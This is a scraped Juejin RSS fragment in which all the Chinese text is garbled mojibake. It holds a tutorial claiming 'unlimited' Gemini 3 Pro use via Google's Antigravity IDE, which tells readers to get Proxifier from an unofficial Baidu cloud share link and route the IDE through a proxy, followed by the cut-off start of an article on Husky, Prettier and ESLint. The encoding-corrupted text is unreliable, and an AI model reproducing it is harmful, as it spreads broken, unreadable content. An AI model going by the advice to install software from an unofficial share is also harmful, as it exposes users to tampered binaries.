content="Gemini3Proæ— é™ä½¿ç”¨æ‰‹æŠŠæ‰‹æ•™ç¨‹"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-11-24T09:08:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çŸ¥è¯†æµ…è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/607378030207176"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Gemini3Proæ— é™ä½¿ç”¨æ‰‹æŠŠæ‰‹æ•™ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/607378030207176/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çŸ¥è¯†æµ…è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T09:08:58.000Z" title="Mon Nov 24 2025 09:08:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Gemini3Proæ— é™ä½¿ç”¨ç²¾ç®€ç‰ˆ</h2>
<p>Antigravityï¼šè°·æ­Œå®˜æ–¹æ¨å‡ºçš„IDEï¼Œç±»ä¼¼äºCursorï¼Œé›†æˆäº†Gemini3Proã€Claude4.5ã€GPTç­‰å„å®¶æœ€å¼ºå¤§çš„æ¨¡å‹ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8411f4000ab5445ea903801428915591~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6K-G5rWF6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580138&amp;x-signature=wOhJZYGAnfUxMTlo0irlUVSskm8%3D" alt="" loading="lazy"/>
ç›´æ¥ä¸‹è½½å®‰è£…Antigravityï¼š**<a href="https://link.juejin.cn?target=https%3A%2F%2Fantigravity.google%2Fdownload%3Fhl%3Dzh-cn**%25E5%25B0%25B1%25E5%258F%25AF%25E4%25BB%25A5%25E5%2585%258D%25E8%25B4%25B9%25E4%25BD%25BF%25E7%2594%25A8%25EF%25BC%258C%25E4%25BD%2586%25E6%2598%25AF%25E5%259C%25A8%25E5%25AE%2589%25E8%25A3%2585%25E8%25BF%2587%25E7%25A8%258B%25E4%25B8%25AD%25E4%25BC%259A%25E6%259C%2589%25E4%25B8%2580%25E4%25BA%259B%25E9%2597%25AE%25E9%25A2%2598%25E5%258D%25A1%25E4%25BD%258F%25E4%25BD%25A0%25EF%25BC%258C%25E6%2583%25B3%25E8%25A6%2581%25E9%25A1%25BA%25E5%2588%25A9%25E4%25BD%25BF%25E7%2594%25A8%25EF%25BC%258C%25E8%25AF%25B7%25E7%259C%258B%25E4%25B8%258B%25E6%2596%2587%25E8%25AF%25A6%25E7%25BB%2586%25E7%2589%2588%25E6%2595%2599%25E7%25A8%258B%25E3%2580%2582" target="_blank" title="https://antigravity.google/download?hl=zh-cn**%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%85%8D%E8%B4%B9%E4%BD%BF%E7%94%A8%EF%BC%8C%E4%BD%86%E6%98%AF%E5%9C%A8%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%B8%AD%E4%BC%9A%E6%9C%89%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E5%8D%A1%E4%BD%8F%E4%BD%A0%EF%BC%8C%E6%83%B3%E8%A6%81%E9%A1%BA%E5%88%A9%E4%BD%BF%E7%94%A8%EF%BC%8C%E8%AF%B7%E7%9C%8B%E4%B8%8B%E6%96%87%E8%AF%A6%E7%BB%86%E7%89%88%E6%95%99%E7%A8%8B%E3%80%82" ref="nofollow noopener noreferrer">antigravity.google/download?hlâ€¦</a></p>
<h2 data-id="heading-1">Gemini3Proæ‰‹æŠŠæ‰‹æ•™ç¨‹</h2>
<h3 data-id="heading-2">Gemini3Proçš„å¼ºå¤§</h3>
<p>ç›®å‰ç½‘ç»œä¸Šå„ç§æµ‹è¯„è§†é¢‘å·²ç»ç»™å¤§å®¶æ™®åŠäº†å¾ˆå¤šï¼Œåˆ·æ–°ç›®å‰å¸‚é¢ä¸Šå„ç§å¤§æ¨¡å‹çš„é«˜åº¦ï¼Œè´´ä¸€å¼ æµ‹è¯•å›¾å¦‚ä¸‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e6481a823f24bb19af25e57eae29dc5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6K-G5rWF6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580138&amp;x-signature=X6Ghpy8LDP9i1Lr563gWaBKqtaE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">å®˜ç½‘ç½‘é¡µç‰ˆæœ‰é™ä½¿ç”¨</h3>
<p>ç›´æ¥è®¿é—®**<a href="https://link.juejin.cn?target=https%3A%2F%2Fgemini.google.com%2Fapp" target="_blank" title="https://gemini.google.com/app" ref="nofollow noopener noreferrer">gemini.google.com/app</a>**
ï¼Œæ¯å¤©ä½¿ç”¨çš„é¢åº¦æœ‰é™ï¼Œä½¿ç”¨æ–¹å¼å¦‚ä¸‹:
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b728dca9e794fc29fd98acc04f0c937~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6K-G5rWF6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580138&amp;x-signature=fzTA6bih2A6LMKPTb81kV9Iq17Q%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">Antigravityè°·æ­Œè‡ªå®¶IDEæ— é™ä½¿ç”¨</h3>
<h4 data-id="heading-5">ç¬¬ä¸€æ­¥ï¼šå®‰è£…Antigravity</h4>
<h5 data-id="heading-6">1.ä¸‹è½½å®‰è£…Antigravityï¼š<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fantigravity.google%2Fdownload%3Fhl%3Dzh-cn" target="_blank" title="https://antigravity.google/download?hl=zh-cn" ref="nofollow noopener noreferrer">antigravity.google/download?hlâ€¦</a></strong></h5>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96a86d72af5543d1876aceee36e9a57a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6K-G5rWF6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580138&amp;x-signature=Orl%2F3q4d3iv36eZZLEP816FOgOg%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-7">2.ä¸‹è½½Proxifierï¼ˆå¿…é¡»è¦ä¸‹è½½ï¼‰</h5>
<p>é“¾æ¥: <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.baidu.com%2Fs%2F12E0gA_rEqL9DovNi2K_TGQ%3Fpwd%3Djcgy" target="_blank" title="https://pan.baidu.com/s/12E0gA_rEqL9DovNi2K_TGQ?pwd=jcgy" ref="nofollow noopener noreferrer">pan.baidu.com/s/12E0gA_rEâ€¦</a></strong></p>
<blockquote>
<p>ä¸ºä»€ä¹ˆè¦ä¸‹è½½Proxifierï¼Ÿ</p>
<p>å› ä¸ºAntigravityåªèƒ½é€šè¿‡TUNæ¨¡å¼ä½¿ç”¨ï¼Œä»£ç†è½¯ä»¶å¦‚V2**ä¸æ”¯æŒTUNæ¨¡å¼ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡Proxifieræ¥ä½¿ç”¨ã€‚</p>
</blockquote>
<p>ç°åœ¨æ‰“å¼€Proxifierå¼€å§‹é…ç½®ï¼š
å…ˆæ‰“å¼€ä½ çš„ç§‘å­¦è½¯ä»¶å¦‚V2***ï¼Œå†æ‰“å¼€Proxifier ç‚¹å‡» é…ç½®æ–‡ä»¶-&gt;ä»£ç†æœåŠ¡å™¨
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e119bc08f9a3429481ec01ba93623ae5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6K-G5rWF6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580138&amp;x-signature=aFuVF%2FVBSzKC3YNGPb8TIKpnujo%3D" alt="" loading="lazy"/>
ç‚¹å‡»æ·»åŠ ï¼Œ
ç„¶åè¾“å…¥ä½ çš„ç§‘å­¦è½¯ä»¶å¯¹åº”socksç«¯å£å¹¶ä¿å­˜
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68ae7eff76ae4e59800693f522d25b73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6K-G5rWF6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580138&amp;x-signature=etLTLhbpbmCOOQdfl3gQxpOfngA%3D" alt="" loading="lazy"/>
ç‚¹å‡»ä»£ç†è§„åˆ™--&gt;æ·»åŠ --&gt;é€‰æ‹©åº”ç”¨ç¨‹åºantigravity.exe--&gt;é€‰æ‹©åŠ¨ä½œsockets5é‚£æ¡è®°å½•ï¼Œç‚¹å‡»ç¡®å®šå³å¯</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66fd76f81f7847cca76ecdb4668d63bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6K-G5rWF6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580138&amp;x-signature=EI20c2O9Bh2eqMJB8LYWDpoSIgo%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-8">3.æ‰“å¼€Antigravity</h5>
<p>å¦‚æœä½ æ²¡æœ‰ç¬¬äºŒæ­¥ï¼Œåˆ°è¿™ä¸€æ­¥ä½ å¯èƒ½å°±ç™»é™†ä¸ä¸Šäº†ï¼Œå› ä¸ºAntigravité€šè¿‡ç§‘å­¦è½¯ä»¶çš„ç³»ç»Ÿä»£ç†æ˜¯ä¸èƒ½ç™»é™†çš„ï¼Œéœ€è¦é€šè¿‡TUNæ¨¡å¼æ‰èƒ½ç™»å½•ã€‚</p>
<p>ç™»é™†å¤±è´¥æ¡ˆä¾‹ï¼šä½ ç½‘é¡µæ˜¾ç¤ºç™»é™†äº†ï¼Œä½†æ˜¯Antigravityè¿˜æ˜¯æ²¡ç™»é™†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5dd0987b27448b0ac32ac492ba704e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6K-G5rWF6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580138&amp;x-signature=h2mtBynrp5bDBsDRzFBLJMDcMjc%3D" alt="" loading="lazy"/></p>
<p>å½“ç„¶å¦‚æœä½ çš„ç§‘å­¦è½¯ä»¶æ˜¯cla**,ä½ åªéœ€è¦æ‰“å¼€TUNæ¨¡å¼ï¼ˆè™šæ‹Ÿç½‘å¡æ¨¡å¼ï¼‰ï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad576b1ad3624968a22c83aee18031ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6K-G5rWF6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580138&amp;x-signature=U5ruh2PfsmKEfZRiIVM3Juo5wmQ%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-9">3.ä½¿ç”¨Antigravityçš„Gemini3Pro</h5>
<p>æ–‡ç« å†™åˆ°è¿™äº†ä¹Ÿæ¥è¿‘å°¾å£°äº†ï¼Œç”Ÿæˆä¸€ä¸ªå°é¢å›¾ä½œä¸ºæ¡ˆä¾‹ç»™å¤§å®¶çœ‹ä¸€ä¸‹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0acf77c7978f432b9b86b5964f84a57c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6K-G5rWF6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764580138&amp;x-signature=muTxGMmqvdz8mSmP2TQ25huXNIs%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-10">æ€»ç»“</h2>
<p>å¥½ç”¨çš„å·¥å…·æ€»ä¼šè¢«å‘ç°ï¼Œå°±æ¯”å¦‚æ­£åœ¨çœ‹è¿™ç¯‡æ–‡ç« çš„ä¼¯ä¹ä»¬ï¼Œç¥å¤§å®¶ç”¨çš„æ„‰å¿«ç©çš„å¼€å¿ƒï¼Œæœ‰ä»€ä¹ˆé—®é¢˜å¯ä»¥ç•™è¨€å“ˆï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‘Šåˆ«â€œå±å±±â€ï¼šç”¨ Husky + Prettier + ESLint æ‰“é€ å‰ç«¯é¡¹ç›®çš„ä»£ç åŸºçŸ³]]></title>    <link>https://juejin.cn/post/7575829296452943882</link>    <guid>https://juejin.cn/post/7575829296452943882</guid>    <pubDate>2025-11-24T09:13:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575829296452943882" data-draft-id="7576090441432727562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‘Šåˆ«â€œå±å±±â€ï¼šç”¨ Husky + Prettier + ESLint æ‰“é€ å‰ç«¯é¡¹ç›®çš„ä»£ç åŸºçŸ³"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-11-24T09:13:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸“ä¸šæŠ„ä»£ç é€‰æ‰‹"/> <meta itemprop="url" content="https://juejin.cn/user/127961159439400"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‘Šåˆ«â€œå±å±±â€ï¼šç”¨ Husky + Prettier + ESLint æ‰“é€ å‰ç«¯é¡¹ç›®çš„ä»£ç åŸºçŸ³
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/127961159439400/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸“ä¸šæŠ„ä»£ç é€‰æ‰‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T09:13:45.000Z" title="Mon Nov 24 2025 09:13:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸€ä¸ªå¤šäººå‚ä¸çš„é¡¹ç›®ï¼Œå¦‚æœæ²¡æœ‰ä»£ç è§„èŒƒï¼Œä¼šå¯¼è‡´ä»£ç æ ·å¼äº”èŠ±å…«é—¨ï¼Œç‰¹åˆ«éš¾çœ‹ã€‚
æˆ‘ç›¸ä¿¡å¯¹äºç¨‹åºå‘˜è¿™ä¸ªèŒä¸šæ¥è¯´ï¼Œä¸€ä¸ªé¡¹ç›®ä¸­ï¼Œä»£ç æ ¼å¼åƒå¥‡ç™¾æ€ªï¼Œæ²¡æœ‰å‡ ä¸ªäººèƒ½å¿å§ã€‚<br/>
ç°åœ¨åœ¨githubä¸Šéšæ„çœ‹ä¸€ä¸ªé¡¹ç›®ï¼Œéƒ½å‡ ä¹æ˜¯é…å¤‡äº†huskyçš„ï¼Œè¿™ä¸ªå·¥å…·å¯ä»¥hookåˆ°gitçš„å‘½ä»¤ï¼Œç„¶åè‡ªåŠ¨è¿è¡Œç›¸å…³è„šæœ¬ï¼Œè¿›è€Œè¾¾åˆ°è‡ªåŠ¨æ ¼å¼åŒ–ä»£ç çš„ç›®çš„ã€‚</p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°±æ¥è¯¦ç»†ä»‹ç»å¦‚ä½•é…ç½® Huskyï¼Œå¹¶ç»“åˆ Prettier å’Œ ESLintï¼Œä¸ºä½ çš„é¡¹ç›®æ„å»ºä¸€ä¸ªåšå®çš„ä»£ç è§„èŒƒé˜²çº¿ã€‚</p>
<h3 data-id="heading-0">æ ¸å¿ƒå·¥å…·æ ˆä¸€è§ˆ</h3>
<p>åœ¨æ·±å…¥é…ç½®ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥è®¤è¯†ä¸€ä¸‹æˆ‘ä»¬å°†è¦ä½¿ç”¨çš„â€œé»„é‡‘ç»„åˆâ€ï¼š</p>
<ul>
<li><strong>Husky:</strong> Git Hooks ç®¡ç†å·¥å…·ï¼Œè´Ÿè´£æ‹¦æˆª Git å‘½ä»¤å¹¶åœ¨ç‰¹å®šé˜¶æ®µæ‰§è¡Œè„šæœ¬ã€‚</li>
<li><strong>Prettier:</strong> å¼ºå¤§çš„ä»£ç æ ¼å¼åŒ–å·¥å…·ï¼Œç¡®ä¿ä»£ç é£æ ¼ç»Ÿä¸€ç¾è§‚ã€‚</li>
<li><strong>ESLint:</strong> é™æ€ä»£ç åˆ†æå·¥å…·ï¼Œç”¨äºå‘ç°å¹¶ä¿®å¤ä»£ç ä¸­çš„æ½œåœ¨é—®é¢˜å’Œä¸ç¬¦åˆè§„èŒƒçš„å†™æ³•ã€‚</li>
<li><strong>lint-staged:</strong> é…åˆ Husky ä½¿ç”¨ï¼Œåªå¯¹ Git æš‚å­˜åŒºçš„æ–‡ä»¶è¿›è¡Œ Lint å’Œæ ¼å¼åŒ–ï¼Œå¤§å¹…æå‡æ•ˆç‡ã€‚</li>
